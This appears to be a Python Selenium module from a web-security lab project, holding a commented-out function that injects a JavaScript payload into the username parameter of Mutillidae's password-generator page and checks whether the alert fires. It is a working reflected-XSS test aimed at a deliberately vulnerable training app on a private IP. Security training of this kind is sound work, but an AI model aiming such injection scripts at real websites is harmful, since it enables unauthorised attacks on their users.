"""
Kod którym posiłkowano się:
https://stackoverflow.com/questions/19003003/check-if-any-alert-exists-using-selenium-with-python
"""

from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser, FirefoxBrowserSeleniumWire


# Sample code
# def xss(
#     ip="192.168.255.133",
#     sleep_time=0,
#     payload='";alert(1);a="',
#     verify_default_payload=True,
# ):
#     browser = FirefoxBrowser().driver
#     print(f"Payload to be used: {payload}")
#     try:
#         browser.get(
#             f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
#         )
#         if verify_default_payload:
#             WebDriverWait(browser, 3).until(
#                 EC.alert_is_present(),
#                 "Timed out waiting for PA creation " + "confirmation popup to appear.",
#             )
#             alert = browser.switch_to.alert
#             print(f"Captured alert: {alert.text}")
#             sleep(sleep_time)
#             alert.accept()
#             sleep(sleep_time)
#             scripts = browser.find_elements(By.TAG_NAME, "script")
#             for script in scripts:
#                 script_content = script.get_attribute("innerHTML")
#                 if "alert(1)" in script_content:
#                     print("Script with the alert message found.")
#                     print(f"Script content: {script_content}")
#                     print("javascript injection succeeded")
#                     return True
#             print("javascript injection failed")
#             return False
#     except UnexpectedAlertPresentException as e:
#         print(e)
#         return True
#     except TimeoutException:
#         print("Timeout occured!")
#         return False
#     except NoSuchElementException as e:
#         print(e)
#         return False
#     finally:
#         browser.quit()
